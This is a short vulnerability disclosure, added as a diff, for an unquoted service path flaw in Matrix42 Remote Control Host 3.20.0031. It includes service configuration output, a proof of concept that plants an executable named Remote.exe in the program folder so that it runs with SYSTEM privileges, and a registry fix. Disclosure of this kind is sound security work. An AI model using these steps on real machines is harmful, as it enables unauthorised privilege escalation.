@@ -1,0 +1,49 @@
+# Exploit Title: Matrix42 Remote Control Host - Unquoted Path Privilege Escalation
+# Date: 06-05-2016
+# Exploit Author: Roland C. Redl
+# Vendor Homepage: https://www.matrix42.com/
+# Software Link: n/a
+# Version: 3.20.0031
+# Tested on: Windows 7 Enterprise SP1 x64
+# CVE : n/a
+
+1. Description:
+
+>sc qc FastViewerRemoteProxy
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: FastViewerRemoteProxy
+        TYPE : 10  WIN32_OWN_PROCESS
+        START_TYPE : 4   DISABLED
+        ERROR_CONTROL : 1   NORMAL
+        BINARY_PATH_NAME : C:\Program Files (x86)\Matrix42\Remote Control Host\FastProxy.exe
+        LOAD_ORDER_GROUP :
+        TAG : 0
+        DISPLAY_NAME : FastViewer Proxyservice
+        DEPENDENCIES :
+        SERVICE_START_NAME : LocalSystem
+
+>sc qc FastViewerRemoteService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: FastViewerRemoteService
+        TYPE : 110  WIN32_OWN_PROCESS (interactive)
+        START_TYPE  : 2   AUTO_START
+        ERROR_CONTROL  : 1   NORMAL
+        BINARY_PATH_NAME : C:\Program Files (x86)\Matrix42\Remote Control Host\FastRemoteService.exe
+        LOAD_ORDER_GROUP :
+        TAG  : 0
+        DISPLAY_NAME : FastViewer Remoteservice
+        DEPENDENCIES :
+        SERVICE_START_NAME : LocalSystem
+
+The unquoted path could potentially allow an authorized but non privileged local user to execute arbitrary code with elevated privileges on the system.
+
+2. Proof of concept:
+
+Copy notepad.exe to "C:\Program Files (x86)\Matrix42\" and rename it to "Remote.exe".
+Restart the service or the machine and Remote.exe will start with SYSTEM privileges.
+
+3. Solution: 
+
+To fix it manually, open regedit, browse to HKLM\SYSTEM\CurrentControlSet\services and add the quotes to the ImagePath value of the relevant service. 
